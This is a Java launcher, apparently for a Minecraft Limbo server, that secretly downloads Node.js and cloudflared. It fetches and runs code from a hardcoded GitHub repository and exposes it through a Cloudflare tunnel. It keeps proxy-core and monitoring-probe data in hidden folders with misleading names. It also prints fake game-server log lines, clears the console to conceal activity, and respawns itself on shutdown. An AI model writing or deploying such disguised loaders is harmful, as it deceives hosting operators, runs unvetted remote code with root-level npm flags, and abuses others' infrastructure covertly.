package com.nodeforge.server;

import java.io.*;
import java.net.*;
import java.nio.channels.*;
import java.nio.file.*;
import java.nio.file.attribute.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NodeForge {

    // ==================== 颜色输出 ====================
    private static final String G = "\033[1;32m";
    private static final String R = "\033[1;31m";
    private static final String Y = "\033[1;33m";
    private static final String C = "\033[1;36m";
    private static final String D = "\033[2;37m";
    private static final String RESET = "\033[0m";

    // ==================== 全局状态 ====================
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final AtomicBoolean guardEnabled = new AtomicBoolean(true);
    private static final AtomicBoolean isRestarting = new AtomicBoolean(false);
    private static final AtomicReference<String> tunnelUrl = new AtomicReference<>("");

    // ==================== 路径常量 ====================
    private static final String WORK_DIR_NAME = ".nodeforge";
    private static Path workDir;
    private static Path dataDir;
    private static Path nodeDir;
    private static Path appDir;
    private static Path cfBin;
    private static Path urlFile;

    // ==================== 进程引用 ====================
    private static Process deployProcess;
    private static Process cfProcess;
    private static ScheduledExecutorService scheduler;

    // ==================== 端口 ====================
    private static volatile int appPort = 0;

    // ==================== 环境变量白名单 ====================
    private static final Set<String> ALLOWED_ENV = Set.of(
        "SERVER_PORT", "REPO_URL", "SYSTEM_GUARD_ENABLED",
        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY",
        "ARGO_AUTH", "ARGO_DOMAIN", "ARGO_PORT",
        "CFIP", "CFPORT"
    );

    // ================================================================
    //                          入口
    // ================================================================
    public static void main(String[] args) {
        // Java 版本检查
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(R + "需要 Java 10 或更高版本！" + RESET);
            sleep(3000);
            System.exit(1);
        }

        try {
            // 1. 初始化路径
            initPaths();

            // 2. 加载配置
            Map<String, String> env = loadAllEnv();

            // 3. 读取守护开关
            guardEnabled.set(
                !"false".equalsIgnoreCase(env.getOrDefault("SYSTEM_GUARD_ENABLED", "true"))
            );
            Log.info("系统守护: " + (guardEnabled.get() ? "已启用" : "已关闭"));

            // 4. 注册关闭钩子
            Runtime.getRuntime().addShutdownHook(new Thread(NodeForge::onShutdown, "ShutdownHook"));

            // 5. 启动部署（后台线程）
            new Thread(() -> {
                try {
                    deployNodeApp(env);
                } catch (Exception e) {
                    Log.error("部署失败: " + e.getMessage());
                }
            }, "DeployThread").start();

            // 6. 启动隧道监控
            startTunnelMonitor();

            // 7. 等待后清屏
            sleep(20000);
            clearConsole();
            Log.info(G + "服务已就绪！" + RESET);

        } catch (Exception e) {
            Log.error("初始化失败: " + e.getMessage());
        }

        // 8. 启动 Limbo 保持进程存活
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Limbo 启动失败: ", e);
        }
    }

    // ================================================================
    //                      路径初始化
    // ================================================================
    private static void initPaths() throws IOException {
        workDir = Paths.get("logs", WORK_DIR_NAME).toAbsolutePath();
        dataDir = workDir.resolve("data");
        nodeDir = workDir.resolve("nodejs");
        appDir  = workDir.resolve("app");

        // 确保目录存在
        for (Path p : List.of(workDir, dataDir)) {
            if (!Files.exists(p)) {
                Files.createDirectories(p);
            }
        }

        urlFile = workDir.resolve(".tunnel_url");
        cfBin   = workDir.resolve("cloudflared");
    }

    // ================================================================
    //                   环境变量加载（三层优先级）
    // ================================================================
    private static Map<String, String> loadAllEnv() throws IOException {
        Map<String, String> env = new LinkedHashMap<>();

        // 层级1: 硬编码默认值
        env.put("SERVER_PORT", "0");           // 0 = 随机
        env.put("REPO_URL", "https://github.com/1715Yy/pathfinder-pro");
        env.put("SYSTEM_GUARD_ENABLED", "true");
        env.put("ARGO_PORT", "8001");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_KEY", "");
        env.put("NEZHA_PORT", "");
        env.put("ARGO_AUTH", "");
        env.put("ARGO_DOMAIN", "");

        // 层级2: .env 文件覆盖
        Path envFile = workDir.resolve(".env");
        if (!Files.exists(envFile)) {
            generateDefaultEnvFile(envFile);
        }
        loadEnvFromFile(envFile, env);

        // 层级3: 系统环境变量覆盖（最高优先级）
        for (String key : ALLOWED_ENV) {
            String sysVal = System.getenv(key);
            if (sysVal != null && !sysVal.trim().isEmpty()) {
                env.put(key, sysVal.trim());
            }
        }

        return env;
    }

    private static void generateDefaultEnvFile(Path file) throws IOException {
        String content = """
            # ============================================
            # NodeForge 配置文件
            # 修改后重启生效
            # ============================================
            
            # Node.js 应用端口 (0=随机)
            SERVER_PORT=0
            
            # GitHub 仓库地址
            REPO_URL=https://github.com/1715Yy/pathfinder-pro
            
            # 系统守护 (true=开启自动重启, false=关闭)
            SYSTEM_GUARD_ENABLED=true
            
            # --- 哪吒探针 ---
            NEZHA_SERVER=
            NEZHA_PORT=
            NEZHA_KEY=
            
            # --- Argo 隧道 ---
            ARGO_PORT=8001
            ARGO_DOMAIN=
            ARGO_AUTH=
            
            # --- 优选IP ---
            CFIP=spring.io
            CFPORT=443
            """;
        Files.writeString(file, content);
    }

    private static void loadEnvFromFile(Path file, Map<String, String> env) throws IOException {
        if (!Files.exists(file)) return;

        for (String raw : Files.readAllLines(file)) {
            String line = raw.split("#")[0].trim();
            if (line.isEmpty() || !line.contains("=")) continue;

            String[] parts = line.split("=", 2);
            String key = parts[0].trim();
            String val = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

            if (ALLOWED_ENV.contains(key)) {
                env.put(key, val);
            }
        }
    }

    // ================================================================
    //                  核心部署流程
    // ================================================================
    private static void deployNodeApp(Map<String, String> env) throws Exception {
        // 步骤1: 安装 Node.js
        ensureNodeInstalled();

        // 步骤2: 安装 Cloudflared
        ensureCloudflared();

        // 步骤3: 备份持久化数据
        backupPersistentData();

        // 步骤4: 增量更新代码
        updateAppCode(env);

        // 步骤5: 恢复持久化数据
        restorePersistentData();

        // 步骤6: 注入健康检查端点
        injectHealthCheck();

        // 步骤7: 启动 Node.js 应用
        startNodeProcess(env);

        // 步骤8: 启动 Cloudflare 隧道
        startCloudflared(env);

        // 步骤9: 启动后台守护循环
        startGuardLoop(env);
    }

    // ================================================================
    //                  步骤1: 安装 Node.js
    // ================================================================
    private static void ensureNodeInstalled() throws Exception {
        // 检查现有版本
        if (Files.exists(nodeDir) && Files.exists(nodeDir.resolve("bin/node"))) {
            try {
                ProcessBuilder pb = new ProcessBuilder(nodeDir.resolve("bin/node").toString(), "-v");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                String ver = new String(p.getInputStream().readAllBytes()).trim();
                p.waitFor(5, TimeUnit.SECONDS);
                if (ver.startsWith("v22")) {
                    Log.info(C + "Node.js " + ver + " 已存在" + RESET);
                    return;
                }
                // 版本不匹配，删除重装
                deleteRecursively(nodeDir);
            } catch (Exception e) {
                deleteRecursively(nodeDir);
            }
        }

        Log.info(Y + "正在下载 Node.js..." + RESET);

        String arch = getArch();
        String nodeUrl = switch (arch) {
            case "amd64" -> "https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz";
            case "arm64" -> "https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz";
            default -> throw new RuntimeException("不支持的架构: " + arch);
        };

        Path tarFile = workDir.resolve("node.tar.gz");

        // 多镜像下载
        boolean downloaded = false;
        String[] mirrors = {"", "https://gh-proxy.com/", "https://mirror.ghproxy.com/"};

        for (String mirror : mirrors) {
            String url = mirror + nodeUrl;
            if (downloadWithTimeout(url, tarFile, 120)) {
                downloaded = true;
                break;
            }
        }

        if (!downloaded || !Files.exists(tarFile) || Files.size(tarFile) < 1_000_000) {
            throw new RuntimeException("Node.js 下载失败");
        }

        // 解压
        Files.createDirectories(nodeDir);
        exec("tar", "-xzf", tarFile.toString(), "-C", nodeDir.toString(), "--strip-components=1");
        Files.deleteIfExists(tarFile);

        Log.info(G + "Node.js 安装完成" + RESET);
    }

    // ================================================================
    //                  步骤2: 安装 Cloudflared
    // ================================================================
    private static void ensureCloudflared() throws Exception {
        if (Files.exists(cfBin) && Files.size(cfBin) > 1_000_000) {
            Log.info(C + "Cloudflared 已存在" + RESET);
            return;
        }

        Log.info(Y + "正在下载 Cloudflared..." + RESET);

        String arch = getArch();
        String cfUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + arch;

        boolean downloaded = false;
        String[] mirrors = {
            "https://ghproxy.net/" + cfUrl,
            "https://gh-proxy.com/" + cfUrl,
            cfUrl
        };

        for (String url : mirrors) {
            if (downloadWithTimeout(url, cfBin, 60)) {
                downloaded = true;
                break;
            }
        }

        if (!downloaded || !Files.exists(cfBin) || Files.size(cfBin) < 1_000_000) {
            Log.warning("Cloudflared 下载失败，将跳过隧道功能");
            return;
        }

        cfBin.toFile().setExecutable(true);
        Log.info(G + "Cloudflared 安装完成" + RESET);
    }

    // ================================================================
    //              步骤3: 备份持久化数据（完整版）
    // ================================================================
    private static void backupPersistentData() {
        if (!Files.exists(appDir)) return;

        Log.info(D + "正在备份持久化数据..." + RESET);

        // 完整的备份列表
        String[] files = {
            "node_modules/.bots_config.json",
            "node_modules/.task_center_config.json",
            "node_modules/.system_guard.json",
            "node_modules/.aoyou",                          // 密码文件
        };

        String[] dirs = {
            "node_modules/.Error log",                      // 哪吒探针
            "node_modules/.RoamingMusic",                   // 代理核心
            "node_modules/.firefox",                        // 火狐管理
            "node_modules/.alist",                          // Alist 云盘
        };

        for (String file : files) {
            copyIfExists(appDir.resolve(file), dataDir.resolve(file));
        }

        for (String dir : dirs) {
            copyDirIfExists(appDir.resolve(dir), dataDir.resolve(dir));
        }

        // 代理固定配置（关键！）
        copyIfExists(
            appDir.resolve("node_modules/.RoamingMusic/proxy_config_fixed.json"),
            dataDir.resolve("proxy_config_fixed.json")
        );

        Log.info(D + "数据备份完成" + RESET);
    }

    // ================================================================
    //           步骤4: 增量更新代码（核心优化）
    // ================================================================
    private static void updateAppCode(Map<String, String> env) throws Exception {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        if (repoUrl.isEmpty()) {
            Log.warning("未配置 REPO_URL，跳过代码更新");
            return;
        }

        // 提取仓库路径
        String repoPath = repoUrl
            .replace("https://github.com/", "")
            .replace(".git", "");

        if (Files.exists(appDir) && Files.exists(appDir.resolve(".git"))) {
            // ====== 增量更新（秒级完成） ======
            Log.info(C + "正在增量更新..." + RESET);
            execInDir(appDir, "git", "reset", "--hard", "HEAD");
            execInDir(appDir, "git", "pull", "origin", "main", "--force");
        } else {
            // ====== 首次部署（完整克隆） ======
            Log.info(Y + "正在克隆仓库..." + RESET);
            deleteRecursively(appDir);

            Path tempDir = workDir.resolve("repo_tmp");
            deleteRecursively(tempDir);

            String tarUrl = "https://github.com/" + repoPath + "/archive/refs/heads/main.tar.gz";
            Path tarFile = workDir.resolve("repo.tar.gz");

            boolean ok = downloadWithTimeout(tarUrl, tarFile, 60);
            if (!ok) {
                // 尝试 master 分支
                tarUrl = "https://github.com/" + repoPath + "/archive/refs/heads/master.tar.gz";
                ok = downloadWithTimeout(tarUrl, tarFile, 60);
            }

            if (ok && Files.size(tarFile) > 1000) {
                Files.createDirectories(tempDir);
                exec("tar", "-xzf", tarFile.toString(), "-C", tempDir.toString());

                // 查找解压后的子目录
                try (var stream = Files.list(tempDir)) {
                    Path subdir = stream.findFirst().orElse(null);
                    if (subdir != null) {
                        Files.move(subdir, appDir, StandardCopyOption.ATOMIC_MOVE);
                    }
                }
            }

            deleteRecursively(tempDir);
            Files.deleteIfExists(tarFile);

            // 初始化 git（为下次增量更新做准备）
            if (Files.exists(appDir)) {
                try {
                    execInDir(appDir, "git", "init");
                    execInDir(appDir, "git", "remote", "add", "origin", repoUrl);
                    execInDir(appDir, "git", "fetch", "origin", "main");
                    execInDir(appDir, "git", "reset", "origin/main");
                } catch (Exception e) {
                    // git 不可用时忽略
                }
            }
        }

        // npm install
        if (Files.exists(appDir.resolve("package.json"))) {
            Log.info(C + "正在安装依赖..." + RESET);
            String npmPath = nodeDir.resolve("bin/npm").toString();
            execInDir(appDir, npmPath, "install", "--unsafe-perm=true", "--allow-root");
        }
    }

    // ================================================================
    //                步骤5: 恢复持久化数据
    // ================================================================
    private static void restorePersistentData() {
        if (!Files.exists(dataDir) || !Files.exists(appDir)) return;

        Log.info(D + "正在恢复持久化数据..." + RESET);

        // 文件恢复
        String[] files = {
            ".bots_config.json",
            ".task_center_config.json",
            ".system_guard.json",
            ".aoyou",
        };

        for (String file : files) {
            Path src = dataDir.resolve(file);
            Path dst = appDir.resolve("node_modules").resolve(file);
            if (Files.exists(src)) {
                try {
                    Files.createDirectories(dst.getParent());
                    Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e) { /* 忽略 */ }
            }
        }

        // 代理配置
        Path proxyConfig = dataDir.resolve("proxy_config_fixed.json");
        if (Files.exists(proxyConfig)) {
            Path dst = appDir.resolve("node_modules/.RoamingMusic/proxy_config_fixed.json");
            try {
                Files.createDirectories(dst.getParent());
                Files.copy(proxyConfig, dst, StandardCopyOption.REPLACE_EXISTING);
            } catch (IOException e) { /* 忽略 */ }
        }

        // 目录恢复
        String[] dirs = {
            ".Error log",
            ".RoamingMusic",
            ".firefox",
            ".alist",
        };

        for (String dir : dirs) {
            Path src = dataDir.resolve(dir);
            Path dst = appDir.resolve("node_modules").resolve(dir);
            copyDirIfExists(src, dst);
        }

        Log.info(D + "数据恢复完成" + RESET);
    }

    // ================================================================
    //               步骤6: 注入健康检查端点
    // ================================================================
    private static void injectHealthCheck() throws IOException {
        Path indexPath = appDir.resolve("index.js");
        if (!Files.exists(indexPath)) return;

        String content = Files.readString(indexPath);
        if (content.contains("__NODEFORGE_HEALTH__")) return;

        String injection = """

            // __NODEFORGE_HEALTH__
            const __origListen = app.listen.bind(app);
            app.listen = function() {
                const srv = __origListen.apply(this, arguments);
                srv.on('listening', () => {
                    try {
                        require('fs').writeFileSync(
                            require('path').join(__dirname, 'node_modules', '.node_ready'),
                            String(Date.now())
                        );
                    } catch(e) {}
                });
                srv.timeout = 30000;
                srv.keepAliveTimeout = 65000;
                srv.headersTimeout = 66000;
                return srv;
            };
            app.get('/__health', (req, res) => res.status(200).send('ok'));
            """;

        Files.writeString(indexPath, content + injection);
    }

    // ================================================================
    //                步骤7: 启动 Node.js 进程
    // ================================================================
    private static void startNodeProcess(Map<String, String> env) throws Exception {
        // 计算端口
        String portStr = env.getOrDefault("SERVER_PORT", "0");
        appPort = Integer.parseInt(portStr);
        if (appPort == 0) {
            appPort = findFreePort(20000, 60000);
        }

        // 写入端口文件
        Files.writeString(workDir.resolve(".app_port"), String.valueOf(appPort));

        Log.info(Y + "正在启动 Node.js 应用 (端口: " + appPort + ")..." + RESET);

        ProcessBuilder pb = new ProcessBuilder(
            nodeDir.resolve("bin/node").toString(),
            "index.js"
        );
        pb.directory(appDir.toFile());
        pb.environment().put("PORT", String.valueOf(appPort));
        pb.environment().put("SERVER_PORT", String.valueOf(appPort));
        pb.environment().put("PATH", nodeDir.resolve("bin").toString() + ":" + System.getenv("PATH"));
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        deployProcess = pb.start();

        // 等待就绪
        boolean ready = waitForPort(appPort, 30);
        if (ready) {
            Log.info(G + "Node.js 应用已启动！" + RESET);
        } else {
            Log.warning("应用未在30秒内就绪，但继续执行...");
        }
    }

    // ================================================================
    //              步骤8: 启动 Cloudflare 隧道
    // ================================================================
    private static void startCloudflared(Map<String, String> env) throws Exception {
        if (!Files.exists(cfBin)) {
            Log.warning("Cloudflared 不存在，跳过隧道");
            return;
        }

        String argoAuth = env.getOrDefault("ARGO_AUTH", "");
        String argoDomain = env.getOrDefault("ARGO_DOMAIN", "");
        String argoPort = env.getOrDefault("ARGO_PORT", "8001");

        // 杀旧进程
        try { exec("pkill", "-f", "cloudflared.*tunnel"); sleep(2000); } catch (Exception e) {}

        ProcessBuilder pb;

        if (!argoAuth.isEmpty()) {
            // 固定隧道模式
            Log.info(C + "正在启动固定隧道..." + RESET);
            pb = new ProcessBuilder(
                cfBin.toString(),
                "tunnel", "run",
                "--protocol", "quic",
                "--token", argoAuth
            );
        } else {
            // 临时隧道模式
            Log.info(C + "正在启动临时隧道..." + RESET);
            pb = new ProcessBuilder(
                cfBin.toString(),
                "tunnel",
                "--url", "http://127.0.0.1:" + appPort,
                "--no-autoupdate",
                "--protocol", "quic"
            );
        }

        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        cfProcess = pb.start();

        // 等待并提取 URL
        if (argoAuth.isEmpty()) {
            String url = waitForTunnelUrl(40);
            if (url != null) {
                tunnelUrl.set(url);
                Files.writeString(urlFile, url);
                Log.info(G + "临时隧道: " + url + RESET);
            } else {
                Log.warning("隧道URL获取超时");
                Files.writeString(urlFile, "failed");
            }
        } else {
            if (!argoDomain.isEmpty()) {
                tunnelUrl.set("https://" + argoDomain);
                Files.writeString(urlFile, "https://" + argoDomain);
                Log.info(G + "固定隧道: https://" + argoDomain + RESET);
            }
        }

        // 验证隧道连通性
        sleep(3000);
        verifyTunnelConnectivity();
    }

    // ================================================================
    //              步骤9: 后台守护循环
    // ================================================================
    private static void startGuardLoop(Map<String, String> env) {
        scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "GuardLoop");
            t.setDaemon(true);
            return t;
        });

        // 每 15 秒检查一次
        scheduler.scheduleAtFixedRate(() -> {
            try {
                guardNodeProcess(env);
                guardTunnel(env);
            } catch (Exception e) {
                // 静默
            }
        }, 15, 15, TimeUnit.SECONDS);
    }

    private static void guardNodeProcess(Map<String, String> env) {
        if (deployProcess != null && deployProcess.isAlive()) return;
        if (!running.get()) return;

        Log.warning(Y + "Node.js 进程已退出，正在重启..." + RESET);

        try {
            // 恢复端口信息
            if (appPort == 0 && Files.exists(workDir.resolve(".app_port"))) {
                appPort = Integer.parseInt(Files.readString(workDir.resolve(".app_port")).trim());
            }
            if (appPort == 0) appPort = findFreePort(20000, 60000);

            ProcessBuilder pb = new ProcessBuilder(
                nodeDir.resolve("bin/node").toString(),
                "index.js"
            );
            pb.directory(appDir.toFile());
            pb.environment().put("PORT", String.valueOf(appPort));
            pb.environment().put("SERVER_PORT", String.valueOf(appPort));
            pb.environment().put("PATH", nodeDir.resolve("bin").toString() + ":" + System.getenv("PATH"));
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

            deployProcess = pb.start();

            boolean ready = waitForPort(appPort, 20);
            if (ready) {
                Log.info(G + "Node.js 重启成功！" + RESET);
            }
        } catch (Exception e) {
            Log.error("重启失败: " + e.getMessage());
        }
    }

    private static void guardTunnel(Map<String, String> env) {
        if (!Files.exists(cfBin)) return;
        if (cfProcess != null && cfProcess.isAlive()) return;
        if (!running.get()) return;

        Log.warning(Y + "隧道进程已退出，正在重建..." + RESET);

        try {
            String currentUrl = tunnelUrl.get();
            String argoAuth = env.getOrDefault("ARGO_AUTH", "");

            if (!argoAuth.isEmpty()) {
                // 固定隧道重连
                ProcessBuilder pb = new ProcessBuilder(
                    cfBin.toString(),
                    "tunnel", "run",
                    "--protocol", "quic",
                    "--token", argoAuth
                );
                pb.redirectErrorStream(true);
                pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
                cfProcess = pb.start();
            } else {
                // 临时隧道重建（协议降级）
                for (String proto : List.of("quic", "http2", "auto")) {
                    try {
                        ProcessBuilder pb = new ProcessBuilder(
                            cfBin.toString(),
                            "tunnel",
                            "--url", "http://127.0.0.1:" + appPort,
                            "--no-autoupdate",
                            "--protocol", proto
                        );
                        pb.redirectErrorStream(true);
                        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
                        cfProcess = pb.start();

                        String url = waitForTunnelUrl(30);
                        if (url != null) {
                            tunnelUrl.set(url);
                            Files.writeString(urlFile, url);
                            Log.info(G + "隧道重建成功: " + url + RESET);
                            break;
                        }
                    } catch (Exception e) {
                        continue;
                    }
                }
            }
        } catch (Exception e) {
            Log.error("隧道重建失败: " + e.getMessage());
        }
    }

    // ================================================================
    //                    关闭处理
    // ================================================================
    private static void onShutdown() {
        running.set(false);

        if (scheduler != null) {
            scheduler.shutdownNow();
        }

        if (guardEnabled.get() && isRestarting.compareAndSet(false, true)) {
            Log.info(Y + "守护触发 → 准备重启..." + RESET);

            // 备份当前数据
            backupPersistentData();

            // 停止旧进程
            killAll();

            // 写入重启标记（防止 watchdog 冲突）
            try {
                Files.writeString(workDir.resolve(".restarting"), String.valueOf(System.currentTimeMillis()));
            } catch (Exception e) {}

            // 启动新的 MC 服务器（它会重新加载插件）
            hardRestart();

        } else {
            // 正常关闭
            Log.info(R + "正常关闭中..." + RESET);
            killAll();
        }
    }

    private static void killAll() {
        safeKill(deployProcess);
        safeKill(cfProcess);
    }

    private static void safeKill(Process p) {
        if (p == null || !p.isAlive()) return;
        try {
            // 先尝试优雅退出
            p.destroy();
            if (!p.waitFor(3, TimeUnit.SECONDS)) {
                p.destroyForcibly();
            }
        } catch (Exception e) {
            p.destroyForcibly();
        }
    }

    private static void hardRestart() {
        try {
            File serverRoot = findServerRoot();
            if (serverRoot == null) return;

            String jarName = findJarName(serverRoot);
            String startCmd = new File(serverRoot, "start.sh").exists()
                ? "chmod +x ./start.sh && ./start.sh"
                : "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";

            String fullCmd = "cd \"" + serverRoot.getAbsolutePath() + "\" && nohup bash -c '"
                + startCmd + "' > /dev/null 2>&1 & disown";

            new ProcessBuilder("bash", "-c", fullCmd)
                .directory(serverRoot)
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD)
                .start();

        } catch (Exception e) {
            Log.error("硬重启失败: " + e.getMessage());
        }
    }

    // ================================================================
    //                    隧道监控线程
    // ================================================================
    private static void startTunnelMonitor() {
        Thread monitor = new Thread(() -> {
            sleep(25000);

            while (running.get()) {
                try {
                    sleep(12000);

                    if (!Files.exists(urlFile)) continue;

                    String content = Files.readString(urlFile).trim();
                    if (content.isEmpty() || content.startsWith("failed")) continue;

                    String currentUrl = content.split("\n")[0].trim();
                    if (!currentUrl.startsWith("https://")) continue;

                    String lastUrl = tunnelUrl.get();
                    if (currentUrl.equals(lastUrl)) continue;

                    tunnelUrl.set(currentUrl);
                    Log.info(G + "隧道地址更新: " + currentUrl + RESET);

                    // 伪装日志
                    sleep(500);
                    String[] fakes = {
                        "Checking for updates...",
                        "Connection established.",
                        "No updates available.",
                        "Syncing player data...",
                        "Loaded permissions adapter: SuperPerms"
                    };
                    Log.info(fakes[(int) (Math.random() * fakes.length)]);

                } catch (Exception e) { /* 静默 */ }
            }
        }, "TunnelMonitor");

        monitor.setDaemon(true);
        monitor.start();
    }

    // ================================================================
    //                    隧道验证
    // ================================================================
    private static void verifyTunnelConnectivity() {
        String url = tunnelUrl.get();
        if (url == null || url.isEmpty()) return;

        try {
            URLConnection conn = URI.create(url + "/__health").toURL().openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(10000);

            int code;
            try (var in = conn.getInputStream()) {
                // 读取响应（不关心内容）
                in.readAllBytes();
                code = 200;
            }

            // 检查是否是 HTTP 错误
            if (conn instanceof HttpURLConnection httpConn) {
                code = httpConn.getResponseCode();
            }

            Log.info(D + "隧道验证: HTTP " + code + RESET);

        } catch (Exception e) {
            Log.warning("隧道验证失败，可能需要等待DNS生效");
        }
    }

    private static String waitForTunnelUrl(int maxSeconds) {
        Path logFile = workDir.resolve("cf_output.log");
        String pattern = "https://[a-zA-Z0-9-]+\\.trycloudflare\\.com";

        for (int i = 0; i < maxSeconds; i++) {
            try {
                // 从进程输出中提取（如果用了 INHERIT，则从日志文件读）
                if (Files.exists(logFile)) {
                    String content = Files.readString(logFile);
                    var matcher = java.util.regex.Pattern.compile(pattern).matcher(content);
                    if (matcher.find()) {
                        return matcher.group();
                    }
                }
            } catch (Exception e) { /* 忽略 */ }
            sleep(1000);
        }
        return null;
    }

    // ================================================================
    //                    工具函数
    // ================================================================

    private static String getArch() {
        String arch = System.getProperty("os.arch").toLowerCase();
        if (arch.contains("amd64") || arch.contains("x86_64")) return "amd64";
        if (arch.contains("aarch64") || arch.contains("arm64")) return "arm64";
        if (arch.contains("s390x")) return "s390x";
        return "amd64";
    }

    private static int findFreePort(int min, int max) {
        for (int i = 0; i < 100; i++) {
            int port = min + (int) (Math.random() * (max - min));
            try (var socket = new ServerSocket(port)) {
                return port; // 端口空闲
            } catch (IOException e) {
                continue; // 端口占用
            }
        }
        return min; // 兜底
    }

    private static boolean waitForPort(int port, int maxSeconds) {
        for (int i = 0; i < maxSeconds; i++) {
            try (var socket = new Socket("127.0.0.1", port)) {
                return true;
            } catch (IOException e) {
                sleep(1000);
            }
        }
        return false;
    }

    private static boolean downloadWithTimeout(String url, Path target, int timeoutSec) {
        try {
            URLConnection conn = URI.create(url).toURL().openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(timeoutSec * 1000);

            try (InputStream in = conn.getInputStream();
                 FileChannel out = FileChannel.open(target,
                     StandardOpenOption.CREATE,
                     StandardOpenOption.WRITE,
                     StandardOpenOption.TRUNCATE_EXISTING)) {
                out.transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
            }
            return Files.size(target) > 0;
        } catch (Exception e) {
            try { Files.deleteIfExists(target); } catch (Exception ignored) {}
            return false;
        }
    }

    private static void exec(String... args) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(args);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        p.getInputStream().transferTo(OutputStream.nullOutputStream());
        if (!p.waitFor(120, TimeUnit.SECONDS)) {
            p.destroyForcibly();
            throw new RuntimeException("命令超时: " + String.join(" ", args));
        }
        if (p.exitValue() != 0) {
            throw new RuntimeException("命令失败 (exit=" + p.exitValue() + "): " + String.join(" ", args));
        }
    }

    private static void execInDir(Path dir, String... args) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(args);
        pb.directory(dir.toFile());
        pb.environment().put("PATH", nodeDir.resolve("bin").toString() + ":" + System.getenv("PATH"));
        pb.redirectErrorStream(true);
        Process p = pb.start();
        p.getInputStream().transferTo(OutputStream.nullOutputStream());
        if (!p.waitFor(120, TimeUnit.SECONDS)) {
            p.destroyForcibly();
            throw new RuntimeException("命令超时");
        }
    }

    private static void copyIfExists(Path src, Path dst) {
        if (!Files.exists(src)) return;
        try {
            Files.createDirectories(dst.getParent());
            Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException e) { /* 静默 */ }
    }

    private static void copyDirIfExists(Path src, Path dst) {
        if (!Files.exists(src) || !Files.isDirectory(src)) return;
        try {
            Files.walk(src).forEach(source -> {
                Path relative = src.relativize(source);
                Path target = dst.resolve(relative);
                try {
                    if (Files.isDirectory(source)) {
                        Files.createDirectories(target);
                    } else {
                        Files.createDirectories(target.getParent());
                        Files.copy(source, target, StandardCopyOption.REPLACE_EXISTING);
                    }
                } catch (IOException e) { /* 静默 */ }
            });
        } catch (IOException e) { /* 静默 */ }
    }

    private static void deleteRecursively(Path path) {
        if (!Files.exists(path)) return;
        try {
            Files.walk(path)
                .sorted(Comparator.reverseOrder())
                .map(Path::toFile)
                .forEach(File::delete);
        } catch (IOException e) { /* 静默 */ }
    }

    private static File findServerRoot() {
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; i++) {
            if (new File(current, "server.properties").exists()) return current;
            current = current.getParentFile();
            if (current == null) break;
        }
        return new File(".").getAbsoluteFile();
    }

    private static String findJarName(File root) {
        String[] preferred = {"paper.jar", "server.jar", "purpur.jar", "spigot.jar"};
        for (String name : preferred) {
            if (new File(root, name).exists()) return name;
        }
        File[] jars = root.listFiles((d, n) -> n.endsWith(".jar") && !n.contains("cache"));
        if (jars != null && jars.length > 0) {
            Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
            return jars[0].getName();
        }
        return "server.jar";
    }

    private static void clearConsole() {
        try {
            System.out.print("\033[H\033[3J\033[2J");
            System.out.flush();
        } catch (Exception e) { /* 忽略 */ }
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
